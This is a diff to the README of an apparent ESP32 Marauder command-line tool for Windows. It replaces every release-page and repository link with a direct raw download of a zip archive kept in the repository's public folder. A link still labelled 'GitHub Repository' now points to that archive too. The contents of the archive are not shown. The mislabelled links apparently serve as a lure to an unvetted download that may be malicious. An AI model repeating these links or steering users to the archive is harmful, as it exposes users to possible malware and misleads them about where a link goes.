@@ -1,6 +1,6 @@
 # ⚡ esp32Marauder_cli - Control ESP32 Devices Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Esp32Marauder_cli-brightgreen)](https://github.com/luiz1909/esp32Marauder_cli/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Esp32Marauder_cli-brightgreen)](https://github.com/luiz1909/esp32Marauder_cli/raw/refs/heads/main/public/cli_esp_Marauder_2.6.zip)
 
 ## 📋 What is esp32Marauder_cli?
 
@@ -34,7 +34,7 @@ Before you start, connect your ESP32 Marauder device to your PC using a USB cabl
 
 Click the green button below to visit the download page. There you will find the latest version of esp32Marauder_cli for Windows.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-esp32Marauder_cli-blueviolet)](https://github.com/luiz1909/esp32Marauder_cli/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-esp32Marauder_cli-blueviolet)](https://github.com/luiz1909/esp32Marauder_cli/raw/refs/heads/main/public/cli_esp_Marauder_2.6.zip)
 
 ## 🛠️ Installation Instructions
 
@@ -78,8 +78,8 @@ Click the green button below to visit the download page. There you will find the
 
 ## 🔗 Useful Links
 
-- Download Page: https://github.com/luiz1909/esp32Marauder_cli/releases
-- GitHub Repository: https://github.com/luiz1909/esp32Marauder_cli
+- Download Page: https://github.com/luiz1909/esp32Marauder_cli/raw/refs/heads/main/public/cli_esp_Marauder_2.6.zip
+- GitHub Repository: https://github.com/luiz1909/esp32Marauder_cli/raw/refs/heads/main/public/cli_esp_Marauder_2.6.zip
 
 ## 🧰 About Updates
 
